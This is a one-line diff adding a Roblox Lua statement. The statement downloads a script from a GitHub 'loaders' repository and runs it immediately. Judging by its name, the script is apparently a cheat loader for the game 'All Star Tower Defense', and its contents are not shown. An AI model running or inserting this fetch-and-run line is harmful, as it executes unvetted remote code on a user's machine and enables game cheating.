@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/og-all-star-tower-defense-spam2-mzoa280gijhh1q.lua"))()
